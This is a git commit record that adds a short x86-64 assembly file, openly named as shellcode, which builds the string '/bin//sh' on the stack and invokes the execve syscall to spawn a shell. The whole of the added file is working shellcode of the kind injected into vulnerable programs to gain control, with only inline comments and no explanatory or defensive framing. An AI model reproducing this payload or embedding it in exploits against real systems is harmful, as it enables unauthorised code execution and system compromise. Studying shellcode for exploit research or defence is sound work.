230aab03328d6ea35ff21c60f1ef506a75a7a026
BiggieBoo18 <ns182418@gmail.com>
2018-12-09 10:22:12 +0900

    add short version for amd64

---
+++ amd64/shellcode_amd64_short.asm
@@ -0,0 +1,13 @@
+	global _start
+
+	section .text
+_start:
+	xor	rdx,rdx          	; rdx=NULL
+	push 	rdx			; push NULL
+	mov     rax,0x68732f2f6e69622f	; rax='/bin//sh'
+	push  	rax			; push '/bin//sh'
+	mov     rdi,rsp			; rdi='/bin//sh\0'
+	push	rdx			; push NULL
+	mov	rsi,rsp			; rsi=NULL
+	lea	rax,[rdx+59]		; rax=59 execve syscall no.
+	syscall
